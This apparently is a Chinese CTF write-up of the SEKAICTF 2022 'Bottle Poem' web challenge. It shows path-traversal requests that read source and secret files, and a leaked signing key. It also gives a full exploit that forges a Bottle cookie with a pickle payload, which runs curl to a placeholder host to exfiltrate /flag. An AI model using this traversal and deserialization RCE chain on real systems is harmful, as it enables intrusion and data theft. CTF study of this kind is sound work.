---
title: SEKAICTF Web Writeup
date: 2022-10-03 22:46:00
updated: 2022-10-03 22:46:00
tags: [ctf,security]
archive: false
description: 一场国外练手赛，题目质量挺高
---

## Bottle Poem
> Come and read poems in the bottle.
> No bruteforcing is required to solve this challenge. Please do not use scanner tools.
> Author: bwjy

Python Bottle框架伪造session打pickle反序列化的题目。

`/show`接口存在任意文件读取漏洞

`/show?id=../../../../../../proc/self/cmdline`得到源码位置`/app/app.py`

`/show?id=../../../../../../app/app.py`读取源码

```python
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

`/show?id=../../../../../../app/config/secret.py`找到secret`sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"`

先成为admin看看有没有什么东西
![图 3](https://s2.loli.net/2022/10/02/PGVurZn9R6w4ISf.png)  

然后把admin的模板文件读出来了也没找到什么

```html
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Sekai's boooootttttttlllllllleeeee</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="text-white bg-zinc-800 container px-4 mx-auto text-center h-screen box-border flex justify-center item-center flex-col">
        Hello, you are {{name}}, but it’s useless.
</body>
</html>
```

看bottle的源码发现是cookie_decode的时候会用pickle.loads,而pickle.loads会将反序列化得到的字符串当作命令执行，因此可以实现RCE。

pickle反序列化可以参考文章<https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>

EXP:
```python
from bottle import route, run,response
import os


sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

class exp():
    def __reduce__(self):
        # cmd = "curl http://x.x.x.x:7777/123?res=`ls -la /|base64 -w 0`"
        cmd = "curl http://x.x.x.x:7777/123?res=`/flag|base64 -w 0`"
        return (os.system, (cmd,))


@route("/sign")
def index():
    try:
        # session = {"name": "admin"}
        session = exp()
        response.set_cookie("name", session, secret=sekai)
        return "success"
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```



![图 2](https://s2.loli.net/2022/10/02/BZdlyWzkIfGiMSK.png)  

![图 1](https://s2.loli.net/2022/10/02/IVm29Hk4PW75MEL.png)  
